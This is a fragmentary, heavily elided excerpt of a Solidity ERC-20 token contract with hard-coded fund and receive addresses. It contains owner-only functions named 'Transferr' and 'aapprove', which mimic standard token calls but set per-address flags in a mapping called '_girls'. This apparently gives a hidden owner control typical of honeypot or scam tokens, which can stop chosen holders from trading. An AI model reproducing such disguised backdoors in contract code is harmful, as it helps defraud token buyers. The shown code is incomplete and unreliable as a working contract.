...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function Transferr(address addr, bool enable) external onlyFunder {
        _girls[addr] = enable;
    }
    ...
    function aapprove(address[] calldata addresses, bool value) public onlyFunder{
...
contract TOKEN is AbsToken {
    constructor() AbsToken(
        ...
        9,//Decimals
        10000000,//Supply
        address(0x0bDf3CF011E4f5987a57617087A245A6cc7fF9d2),//FundAddress
        address(0x0bDf3CF011E4f5987a57617087A245A6cc7fF9d2)//ReceiveAddress
    ){
    }
}